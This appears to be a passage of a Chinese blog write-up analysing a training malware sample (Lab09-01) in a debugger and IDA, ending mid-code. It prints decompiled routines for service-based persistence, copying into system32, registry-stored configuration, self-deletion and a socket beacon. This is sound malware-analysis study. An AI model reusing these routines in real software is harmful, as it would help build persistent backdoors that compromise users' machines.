+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220824132407112.png" alt="image-20220824132407112">	</p>
+<p>可见跳过删除自身，push参数call 402510</p>
+<p>分析402510函数，发现对传入参数进行是否为abcd的校验</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220824133448159.png" alt="image-20220824133448159"> </p>
+<p>校验失败，call 402410函数，就是之前删除自身的函数</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220824133644854.png" alt="image-20220824133644854"> </p>
+<p>改变参数为-in abcd，即可跳过</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220824133848104.png" alt="image-20220824133848104"> </p>
+<p>call 0040380，ida分析为_mbscmp函数</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220824134418260.png" alt="image-20220824134418260"> </p>
+<p>call 4025B0</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220824141400188.png" alt="image-20220824141400188"> </p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220824141515577.png" alt="image-20220824141515577"> </p>
+<p>该函数作用为获取文件名且返回result&#x3D;0</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220824142219767.png" alt="image-20220824142219767"> </p>
+<p>接着往下走，call 402600 应该是最重要的对应参数函数</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220824142336628.png" alt="image-20220824142336628"> </p>
+<p>可以看到所传参数为4025B0的返回值（即当前文件文件名）</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825164520644.png" alt="image-20220825164520644"> </p>
+<p>跟进后看到call了_alloca_probe（可能与注册内存有关，先不管）和4025b0（先前分析过为截取文件名）</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825165228995.png" alt="image-20220825165228995"> </p>
+<p> 接着跟进发现跳转到402632，发现此函数前部分是实现拼接字符串%SYSTEMROOT%\system32\Lab09-01.exe的操作，然后调用OpenScManagerA</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825165810548.png" alt="image-20220825165810548"> </p>
+<p>可以OpenScManagerA传入参数为3个立即数，之前分析知道它返回一个服务控制管理器句柄，所有要和服务交互的代码会调用这个函数；</p>
+<p>对于这种官方API函数可以跳过</p>
+<p>接着调用OpenService函数，参数为自身文件名，可以判断开启一个自身服务</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825170308202.png" alt="image-20220825170308202"> </p>
+<p>接着调用ChangeServiceConfigA和CloseService函数</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825170611821.png" alt="image-20220825170611821"> </p>
+<p>其中ChangeServiceConfigA所传参数如下，hService为之前开启的自身服务</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825170736958.png" alt="image-20220825170736958"> </p>
+<p>再往下发现就跳出了402600函数，因此可以推断-in参数为创建服务功能，ida F5伪代码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_402600</span><span class="params">(LPCSTR lpServiceName)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax@2</span></span><br><span class="line">  SC_HANDLE hService; <span class="comment">// [sp+Ch] [bp-1408h]@5</span></span><br><span class="line">  SC_HANDLE hServicea; <span class="comment">// [sp+Ch] [bp-1408h]@9</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [sp+10h] [bp-1404h]@1</span></span><br><span class="line">  CHAR Filename; <span class="comment">// [sp+410h] [bp-1004h]@14</span></span><br><span class="line">  CHAR DisplayName; <span class="comment">// [sp+810h] [bp-C04h]@9</span></span><br><span class="line">  CHAR BinaryPathName; <span class="comment">// [sp+C10h] [bp-804h]@6</span></span><br><span class="line">  SC_HANDLE hSCManager; <span class="comment">// [sp+1010h] [bp-404h]@3</span></span><br><span class="line">  CHAR Src; <span class="comment">// [sp+1014h] [bp-400h]@3</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( sub_4025B0(&amp;v4) ) </span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;Src, aSystemrootSyst);  <span class="comment">//aSystemrootSyst==%SYSTEMROOT%\system32\</span></span><br><span class="line"><span class="comment">  strcat(&amp;Src, &amp;v4);</span></span><br><span class="line">  <span class="built_in">strcat</span>(&amp;Src, a_exe);</span><br><span class="line">  hSCManager = OpenSCManagerA(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0xF003F</span>u);  <span class="comment">//调用OpenSCManagerA，打开一个服务管理器，</span></span><br><span class="line">  <span class="keyword">if</span> ( !hSCManager )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  hService = OpenServiceA(hSCManager, lpServiceName, <span class="number">0xF01FF</span>u); <span class="comment">//服务即自身exe，创建一个服务，</span></span><br><span class="line">  <span class="keyword">if</span> ( hService ) <span class="comment">//如果服务已经创建打开服务</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !ChangeServiceConfigA(hService, <span class="number">0xFFFFFFFF</span>, <span class="number">2u</span>, <span class="number">0xFFFFFFFF</span>, &amp;BinaryPathName, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) )</span><br><span class="line">    &#123;     <span class="comment">//并添加进启动项</span></span><br><span class="line">      CloseServiceHandle(hService);</span><br><span class="line">      CloseServiceHandle(hSCManager);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    CloseServiceHandle(hService);</span><br><span class="line">    CloseServiceHandle(hSCManager);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(&amp;DisplayName, lpServiceName);</span><br><span class="line">    <span class="built_in">strcat</span>(&amp;DisplayName, aManagerService);  <span class="comment">//创建一个服务</span></span><br><span class="line">    hServicea = CreateServiceA(hSCManager, lpServiceName, &amp;DisplayName, <span class="number">0xF01FF</span>u, <span class="number">0x20</span>u, <span class="number">2u</span>, <span class="number">1u</span>, &amp;Src, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !hServicea )</span><br><span class="line">    &#123;</span><br><span class="line">      CloseServiceHandle(hSCManager);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    CloseServiceHandle(hServicea);</span><br><span class="line">    CloseServiceHandle(hSCManager);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( ExpandEnvironmentStringsA(&amp;Src, &amp;BinaryPathName, <span class="number">0x400</span>u) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( GetModuleFileNameA(<span class="number">0</span>, &amp;Filename, <span class="number">0x400</span>u) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( CopyFileA(&amp;Filename, &amp;BinaryPathName, <span class="number">0</span>) ) <span class="comment">//将自己复制到 %SYSTEMROOT%\\system32\\xxx，即写进system32目录</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( sub_4015B0(&amp;BinaryPathName) )</span><br><span class="line">          result = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          result = sub_401070(aUps, aHttpWww_practi, a80, a60) != <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到已启动自身服务</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220824143845843.png" alt="image-20220824143845843"> </p>
+<p>至此，-in参数分析结束</p>
+<p>接着分析-re参数</p>
+<p>修改参数为-re abcd</p>
+<p>经过_mbscmp函数后eax返回值为1，跳转到-re参数</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825171533060.png" alt="image-20220825171533060"> </p>
+<p>接着和-in参数一样call 40380f比较字符串,call 4025b0获取文件名</p>
+<p>接着call 402900进入-re参数函数</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825173245851.png" alt="image-20220825173245851"> </p>
+<p>反汇编查看代码,初步判断为删除服务的，od跟进看看</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_402900</span><span class="params">(LPCSTR lpServiceName)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax@2</span></span><br><span class="line">  SC_HANDLE hService; <span class="comment">// [sp+Ch] [bp-C08h]@3</span></span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// [sp+10h] [bp-C04h]@7</span></span><br><span class="line">  CHAR Dst; <span class="comment">// [sp+410h] [bp-804h]@9</span></span><br><span class="line">  SC_HANDLE hSCManager; <span class="comment">// [sp+810h] [bp-404h]@1</span></span><br><span class="line">  CHAR Src; <span class="comment">// [sp+814h] [bp-400h]@9</span></span><br><span class="line"></span><br><span class="line">  hSCManager = OpenSCManagerA(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0xF003F</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( hSCManager )</span><br><span class="line">  &#123;</span><br><span class="line">    hService = OpenServiceA(hSCManager, lpServiceName, <span class="number">0xF01FF</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( hService )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( DeleteService(hService) )</span><br><span class="line">      &#123;</span><br><span class="line">        CloseServiceHandle(hSCManager);</span><br><span class="line">        CloseServiceHandle(hService);</span><br><span class="line">        <span class="keyword">if</span> ( sub_4025B0(&amp;v3) )</span><br><span class="line">        &#123;</span><br><span class="line">          result = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">strcpy</span>(&amp;Src, aSystemrootSyst);</span><br><span class="line">          <span class="built_in">strcat</span>(&amp;Src, &amp;v3);</span><br><span class="line">          <span class="built_in">strcat</span>(&amp;Src, a_exe);</span><br><span class="line">          <span class="keyword">if</span> ( ExpandEnvironmentStringsA(&amp;Src, &amp;Dst, <span class="number">0x400</span>u) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( DeleteFileA(&amp;Dst) )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( sub_401070(&amp;unk_40EB60, &amp;unk_40EB60, &amp;unk_40EB60, &amp;unk_40EB60) )</span><br><span class="line">                result = <span class="number">1</span>;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                result = sub_401210() != <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              result = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            result = <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        CloseServiceHandle(hSCManager);</span><br><span class="line">        CloseServiceHandle(hService);</span><br><span class="line">        result = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      CloseServiceHandle(hSCManager);</span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同样的流程，只不过open改为deleteService</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825173545489.png" alt="image-20220825173545489"> </p>
+<p>跟进发现服务已禁用</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825173934292.png" alt="image-20220825173934292">  </p>
+<p>接着deletefile</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825173828296.png" alt="image-20220825173828296"> </p>
+<p>到此，对于-re参数功能的分析已经结束，我们知道这是删除服务功能；</p>
+<p>下面分析-c参数</p>
+<p>修改参数为-c abcd</p>
+<p>进入调试执行，此处应该就是-c参数代码段</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825195723113.png" alt="image-20220825195723113"> </p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825204505319.png" alt="image-20220825204505319"> </p>
+<p>可以看到有2个jnz跳转(402cd9,402ccf)</p>
+<p>因为参数为-c所以402cd9不跳转，接下来分析下402ccf,od中是跳转了的</p>
+<p>简单反汇编一下可以看到，判断参数是否为7</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825205048492.png" alt="image-20220825205048492"> </p>
+<p>如果不为7，则call 402410,之前分析过这个函数是删除自身 </p>
+<p>更改参数如图，实际指令为(xxxx.exe -c 111 222 333 444 abcd)共7个参数，后重新调试</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825210040591.png" alt="image-20220825210040591"> </p>
+<p>可以看到进入401070函数，并对输入的参数111 222 333 444处理</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825210313255.png" alt="image-20220825210313255"> </p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825210515185.png" alt="image-20220825210515185"> </p>
+<p>参数入栈后调用401070,应该就是-c的函数了，进入看看</p>
+<p> 大概意思就是创建注册表key，然后设置value，一步一步跟进</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825205316100.png" alt="image-20220825205316100"> </p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825210834559.png" alt="image-20220825210834559"> </p>
+<p>打开注册表按照参数发现雀氏添加了所传入的参数</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825211222687.png" alt="image-20220825211222687">  </p>
+<p>接着跳出main函数，结束</p>
+<p>至此-c 参数分析完毕，即向指定注册表添加value</p>
+<p>接着分析-cc abcd</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825212325566.png" alt="image-20220825212325566"> </p>
+<p>有两个跳转，od跟进发现并没有跳转，先过。接着call 401280</p>
+<p>反汇编查看代码</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825212923365.png" alt="image-20220825212923365"> </p>
+<p>大概就是注册表查value</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825213434020.png" alt="image-20220825213434020"> </p>
+<p>打开注册表，然后查值</p>
+<p>跳出401280后call 402e74（感觉想printf函数）</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825213657475.png" alt="image-20220825213657475"> </p>
+<p>  发现将查询到的value打印出来，然后删除自身，结束</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825213749050.png" alt="image-20220825213749050"> </p>
+<p>接下来分析无参，设置参数为abcd</p>
+<p>跳转至此401000，</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825215514339.png" alt="image-20220825215514339"> </p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825220021109.png" alt="image-20220825220021109"> </p>
+<p>接着call 402360</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825220103045.png" alt="image-20220825220103045"> </p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825220208694.png" alt="image-20220825220208694"> </p>
+<p>发现是一个死循环，且通过401280和402020跳出循环</p>
+<p>查看401280</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825220353919.png" alt="image-20220825220353919"> </p>
+<p>猜测如果查询注册表中的value，则跳出循环</p>
+<p>查看402020</p>
+<p>代码较长不放了</p>
+<p>先call了401e60</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> <span class="type">int</span> __cdecl <span class="title function_">sub_401E60</span><span class="params">(<span class="type">char</span> *a1, <span class="type">signed</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> result; <span class="comment">// eax@2</span></span><br><span class="line">  u_short hostshort[<span class="number">2</span>]; <span class="comment">// [sp+8h] [bp-1424h]@3</span></span><br><span class="line">  <span class="type">char</span> name; <span class="comment">// [sp+Ch] [bp-1420h]@1</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// [sp+40Ch] [bp-1020h]@11</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [sp+410h] [bp-101Ch]@1</span></span><br><span class="line">  <span class="type">char</span> *v7; <span class="comment">// [sp+414h] [bp-1018h]@13</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [sp+418h] [bp-1014h]@5</span></span><br><span class="line">  <span class="type">char</span> *v9; <span class="comment">// [sp+428h] [bp-1004h]@9</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [sp+42Ch] [bp-1000h]@7</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">4096</span>;</span><br><span class="line">  <span class="keyword">if</span> ( sub_401420(&amp;name, <span class="number">1024</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( sub_401470(hostshort) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( sub_401D80(&amp;v8) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( sub_401AF0(&amp;name, hostshort[<span class="number">0</span>], (<span class="type">int</span>)&amp;v8, &amp;v10, (<span class="type">int</span>)&amp;v6) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="built_in">strstr</span>(&amp;v10, asc_40C090);</span><br><span class="line">    <span class="keyword">if</span> ( v9 )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = v9;</span><br><span class="line">      v9 = <span class="built_in">strstr</span>(v9, asc_40C088);</span><br><span class="line">      <span class="keyword">if</span> ( v9 )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = v9;</span><br><span class="line">        <span class="keyword">if</span> ( v9 - v5 + <span class="number">1</span> &lt;= a2 )</span><br><span class="line">        &#123;</span><br><span class="line">          qmemcpy(a1, &amp;v5[<span class="built_in">strlen</span>(asc_40C090)], v7 - v5 - <span class="built_in">strlen</span>(asc_40C090));</span><br><span class="line">          a1[v7 - v5 - <span class="built_in">strlen</span>(asc_40C090)] = <span class="number">0</span>;</span><br><span class="line">          result = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          result = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中401420中调用了401280，即-cc参数，就是查询value</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825222101625.png" alt="image-20220825222101625"> </p>
+<p>接着call了401470，进去看到call了401280和402f6a</p>
+<p>接着call了401d80</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825222744151.png" alt="image-20220825222744151"> </p>
+<p>先获取了当前时间time</p>
+<p>然后4030e0函数将40C180的值赋为time</p>
+<p>接着call 401D10，跟进去看</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825223222184.png" alt="image-20220825223222184"> </p>
+<p>返回一个不是数字&amp;&amp;不是小写字母&amp;&amp;不是大写字母的v1（此处返回的是54）</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825223421058.png" alt="image-20220825223421058"></p>
+<p>不满足条件接着一直循环 </p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220826085643786.png" alt="image-20220826085643786"> </p>
+<p>跳出，接着call 401AF0，参数如栈中所示</p>
+<p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220826091132206.png" alt="image-20220826091132206"> </p>
+<p>代码如下，和socket网络通信有关</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_401AF0</span><span class="params">(<span class="type">char</span> *name, u_short hostshort, <span class="type">int</span> a3, <span class="type">char</span> *a4, <span class="type">int</span> a5)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax@2</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [sp+10h] [bp-60Ch]@5</span></span><br><span class="line">  SOCKET s; <span class="comment">// [sp+210h] [bp-40Ch]@1</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [sp+214h] [bp-408h]@1</span></span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [sp+218h] [bp-404h]@3</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [sp+618h] [bp-4h]@5</span></span><br><span class="line"></span><br><span class="line">  s = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( sub_401640((<span class="type">int</span>)&amp;s, name, hostshort) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;buf, aGet);</span><br><span class="line">  <span class="built_in">strcat</span>(&amp;buf, (<span class="type">const</span> <span 